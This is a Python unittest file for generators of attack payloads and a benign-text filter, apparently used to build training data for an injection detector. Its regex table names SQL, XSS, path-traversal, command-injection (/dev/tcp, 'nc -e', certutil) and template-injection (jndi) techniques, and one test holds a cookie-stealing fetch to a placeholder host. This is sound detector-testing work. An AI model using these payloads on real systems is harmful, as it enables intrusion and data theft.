"""Tests for the attack grammars in `attacks.py`."""

import random
import re
import time
import unittest

import attacks
import benign

SAMPLES = 6000


def draw(generator, seed, count=SAMPLES):
    rng = random.Random(seed)
    return [generator(rng) for _ in range(count)]


# Markers of techniques that each grammar must produce. Each one must be
# present in a generated sample, so a grammar cannot silently lose a branch.
TECHNIQUES = {
    attacks.M_SQL: (
        r"(?i)union", r"(?i)sleep\(", r"(?i)waitfor", r"(?i)extractvalue|updatexml", r"(?i)order(\s|%20|\+|/\*\*/)+by",
        r"(?i)xp_cmdshell", r"(?i)into(\s|%20|\+|/\*\*/)+(outfile|dumpfile)", r"(?i)information_schema",
        r"(?i)substr|mid\(", r"(?i)having", r"(?i)benchmark\(", r"(?i)pg_sleep", r"(?i)dbms_pipe", r"(?i)\bxor\b",
        r"^(admin|root|administrator)", r"(?i)load_file",
    ),
    attacks.M_MARKUP: (
        r"(?i)<script", r"(?i)onerror=", r"(?i)javascript:", r"(?i)<!ENTITY", r"xi:include", r"srcdoc=",
        r"(?i)formaction", r"(?i)<svg", r"(?i)<iframe", r"data:text/html", r"(?i)<meta", r"expression\(",
        r"(?i)<style", r"(?i)<base", r"(?i)<object|<embed", r"\];|\';|\";", r"(?i)ontoggle|onanimationstart|onbegin",
        r"<template>|<noscript>|<xmp>",
    ),
    attacks.M_PATH: (
        r"\.\./", r"\.\.\\", r"%2e%2e", r"\.\.%2f", r"\.\.%5c", r"\.\.\.\./", r"\.\.;/", r"php://filter",
        r"file://", r"\\\\\?\\", r"[cC]:\\", r"%c0%af|%c0%ae", r"%252e|%252f", r"%00", r"WEB-INF|\.git/",
        r"proc/self", r"win\.ini", r"zip://|phar://|jar:",
    ),
    attacks.M_CMD: (
        r";", r"\|", r"&&", r"`", r"\$\(", r"\$\{IFS\}|\$IFS", r"(?i)powershell", r"/dev/tcp", r"(?i)certutil",
        r"\n|%0a", r"\?\?\?|''|\\", r"base64 -d", r"nc -e|ncat", r"(?i)cmd(\.exe)? /c", r"<\(|>\(", r"\^",
        r"\{[a-z]+,", r"sleep \d+|timeout /t",
    ),
    attacks.M_TEMPLATE: (
        r"\{\{", r"\$\{", r"#\{", r"<%=", r"\{%", r"\$\{jndi:", r"\$\{\$\{", r"__globals__|__subclasses__",
        r"T\(java\.lang", r"freemarker", r"#set\(", r"@java\.lang\.Runtime", r"\{php\}|\$smarty",
        r"_self\.env|\|filter\(", r"constructor\.constructor", r"__\$\{", r"\$\{(env|sys):",
    ),
    attacks.M_HEADER: (
        r"\r\n", r"%0[dD]%0[aA]", r"%0a", r"(?i)set-cookie", r"(?i)location", r"HTTP/1\.[01] \d{3}",
        r"(?i)bcc:|cc:", r"(?i)transfer-encoding", r"(?i)content-length", r"%250d|%E5%98%8A", r"(GET|POST|PUT|DELETE|HEAD) /",
        r"\\r\\n",
    ),
}


class GrammarTest(unittest.TestCase):
    def test_deterministic_for_a_seed(self):
        for bit, generator in attacks.GENERATORS.items():
            with self.subTest(generator=generator.__name__):
                self.assertEqual(draw(generator, 11, 300), draw(generator, 11, 300))
                self.assertNotEqual(draw(generator, 11, 300), draw(generator, 12, 300))

    def test_labels_carry_the_category_and_nothing_malformed(self):
        for bit, generator in attacks.GENERATORS.items():
            with self.subTest(generator=generator.__name__):
                for payload, mask in draw(generator, 5):
                    self.assertTrue(mask & bit)
                    self.assertFalse(mask & attacks.M_MALFORMED, payload)
                    self.assertFalse(mask & ~0xFF)
                    payload.decode("utf-8")
                    self.assertNotIn(0, payload)
                    self.assertTrue(1 <= len(payload) <= 400, payload)

    def test_payloads_are_nearly_unique(self):
        floors = {attacks.M_TEMPLATE: 0.45}
        for bit, generator in attacks.GENERATORS.items():
            with self.subTest(generator=generator.__name__):
                payloads = [payload for payload, _ in draw(generator, 6)]
                share = len(set(payloads)) / len(payloads)
                self.assertGreater(share, floors.get(bit, 0.85))

    def test_every_technique_is_generated(self):
        for bit, patterns in TECHNIQUES.items():
            generator = attacks.GENERATORS[bit]
            text = [payload.decode("utf-8") for payload, _ in draw(generator, 7, 12000)]
            for pattern in patterns:
                with self.subTest(generator=generator.__name__, pattern=pattern):
                    compiled = re.compile(pattern)
                    self.assertTrue(any(compiled.search(sample) for sample in text))

    def test_layered_encoding_sets_the_obfuscation_bit(self):
        layered = re.compile(rb"%25[0-9A-Fa-f]{2}|%[cC][01]%|%[eE]0%80|%u[0-9A-Fa-f]{4}")
        for bit, generator in attacks.GENERATORS.items():
            with self.subTest(generator=generator.__name__):
                for payload, mask in draw(generator, 8):
                    if layered.search(payload):
                        self.assertTrue(mask & attacks.M_OBFUSCATION, payload)

    def test_obfuscation_is_a_minority_of_each_category(self):
        for bit, generator in attacks.GENERATORS.items():
            with self.subTest(generator=generator.__name__):
                masks = [mask for _, mask in draw(generator, 9)]
                share = sum(1 for mask in masks if mask & attacks.M_OBFUSCATION) / len(masks)
                self.assertLess(share, 0.3)

    def test_benign_check_rejects_almost_every_payload(self):
        # The final benign check keeps generated benign text away from the
        # grammars. A payload that passes it is a short or ambiguous form,
        # such as `admin'` or a host name followed by a line break.
        limits = {attacks.M_SQL: 0.03, attacks.M_MARKUP: 0.03, attacks.M_PATH: 0.005, attacks.M_CMD: 0.06,
                  attacks.M_TEMPLATE: 0.01, attacks.M_HEADER: 0.01}
        for bit, generator in attacks.GENERATORS.items():
            with self.subTest(generator=generator.__name__):
                payloads = [payload for payload, _ in draw(generator, 10)]
                passed = sum(1 for payload in payloads if benign.benign_ok(payload))
                self.assertLess(passed / len(payloads), limits[bit])

    def test_no_traversal_passes_the_benign_check(self):
        for payload, _ in draw(attacks.gen_path, 14):
            if b"../" in payload or b"..\\" in payload:
                self.assertFalse(benign.benign_ok(payload), payload)

    def test_benign_check_keeps_ordinary_text(self):
        rng = random.Random(13)
        samples = [benign.sample(rng)[0] for _ in range(6000)]
        rejected = sum(1 for sample in samples if not benign.benign_ok(sample))
        self.assertLess(rejected / len(samples), 0.03)


class ShapeLabelTest(unittest.TestCase):
    def test_a_sensitive_file_is_a_traversal_in_every_grammar(self):
        target = re.compile(r"(?i)(/|\\\\)(etc[/\\\\]passwd|windows[/\\\\]win\.ini|proc/self/environ)")
        for bit, generator in attacks.GENERATORS.items():
            with self.subTest(generator=generator.__name__):
                for payload, mask in draw(generator, 15, 4000):
                    if target.search(payload.decode("utf-8", "replace")):
                        self.assertTrue(mask & attacks.M_PATH, payload)

    def test_a_split_keyword_is_obfuscation(self):
        for payload, mask in draw(attacks.gen_markup, 16, 4000):
            if re.search(rb"'al'\+'ert'|'ale'\+'rt'|`al`\+`ert`|java\tscript", payload):
                self.assertTrue(mask & attacks.M_OBFUSCATION, payload)
        self.assertEqual(attacks.shape_labels(b"top['al'+'ert'](1)"), attacks.M_OBFUSCATION)
        self.assertEqual(attacks.shape_labels(b"{% include '/etc/passwd' %}"), attacks.M_PATH)
        self.assertEqual(attacks.shape_labels(b"fetch('//a.b/?c='+document.cookie)"), 0)

    def test_every_sensitive_file_fails_the_benign_check(self):
        for name in attacks.SENSITIVE_FILES + attacks.WINDOWS_FILES:
            for form in ("/" + name, "../" + name, "../../" + name, "file:///" + name, "?f=" + name):
                with self.subTest(form=form):
                    self.assertFalse(benign.benign_ok(form.encode()))

    def test_benign_check_is_linear_on_long_input(self):
        for text in ("'" + " /**/" * 100, "'" + "/*" * 250, "' " + "%20" * 160, "1" + " ;" * 250, "x`" * 250,
                     "<" * 500, "../" * 170, "{{" * 250, "\\" * 500, "a=" * 250, "' or " * 100):
            with self.subTest(text=text[:12]):
                start = time.perf_counter()
                benign.benign_ok(text.encode())
                self.assertLess(time.perf_counter() - start, 0.5)


if __name__ == "__main__":
    unittest.main()
